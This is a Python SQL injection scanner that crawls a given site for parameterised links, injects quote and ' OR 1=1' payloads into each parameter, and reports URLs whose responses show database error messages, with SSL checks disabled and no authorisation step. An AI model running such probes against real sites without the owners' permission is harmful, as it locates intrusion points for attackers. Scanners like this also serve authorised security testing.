#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from bs4 import BeautifulSoup
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Basic SQL Injection payloads to test
sqli_payloads = ["'", "';", "'--", '"', '")', "' OR '1'='1", "' OR 1=1--", '" OR "1"="1', "') OR ('1'='1"]

def find_links_with_params(base_url):
    """Crawl page to find links with parameters."""
    found_links = []
    try:
        print("[+] Crawling for links with parameters...")
        response = requests.get(base_url, timeout=10, verify=False)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for link_tag in soup.find_all('a', href=True):
            href = link_tag['href']
            if href.startswith('/'):
                parsed_base = urlparse(base_url)
                href = f"{parsed_base.scheme}://{parsed_base.netloc}{href}"
            elif not href.startswith(('http://', 'https://')):
                href = requests.compat.urljoin(base_url, href)
            
            parsed_href = urlparse(href)
            if parsed_href.query:
                found_links.append(href)
                print(f"  [*] Found URL with parameters: {href}")
    except Exception as e:
        print(f"[-] Error crawling: {e}")
    return found_links

def test_sqli(url):
    """Test SQLi on a given URL with parameters."""
    print(f"\n[+] Testing URL: {url}")
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        print("[-] No parameters to test in this URL.")
        return []

    vulnerable = []

    for param in params:
        original_value = params[param][0]
        print(f"  [*] Testing parameter: {param}")

        for payload in sqli_payloads:
            test_params = params.copy()
            test_params[param] = original_value + payload

            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

            try:
                res = requests.get(test_url, timeout=10, verify=False)
                errors = ["You have an error in your SQL syntax",
                          "Warning: mysql_fetch",
                          "Warning: pg_query",
                          "syntax error",
                          "unclosed quotation mark",
                          "quoted string not properly terminated"]

                for error in errors:
                    if error.lower() in res.text.lower():
                        print(f"    [!!!] VULNERABLE: {param} with payload: {payload}")
                        vulnerable.append({
                            "url": url,
                            "parameter": param,
                            "payload": payload
                        })
                        break
            except Exception as e:
                print(f"    [-] Request failed: {e}")
            
            time.sleep(0.5)

    return vulnerable

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 sqli_scanner.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]

    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    print("[+] Starting SQL Injection scan on:", target)
    all_links = []

    parsed_target = urlparse(target)
    if parsed_target.query:
        all_links.append(target)
    else:
        all_links.extend(find_links_with_params(target))

    if not all_links:
        print("[-] No links with parameters found to test.")
        sys.exit(0)

    total_vuln = []

    for link in all_links:
        vulnerabilities = test_sqli(link)
        total_vuln.extend(vulnerabilities)

    print("\n" + "="*60)
    print("SQL INJECTION SCAN SUMMARY")
    print("="*60)

    if total_vuln:
        print(f"\n[+] Found {len(total_vuln)} SQL Injection points:")
        for vuln in total_vuln:
            print(f"  - URL: {vuln['url']}")
            print(f"    Parameter: {vuln['parameter']}")
            print(f"    Payload: {vuln['payload']}")
    else:
        print("\n[-] No SQL Injection vulnerabilities found.")

    print("\n[!] Remember: Always verify manually before reporting.")

if __name__ == "__main__":
    main()
# End of script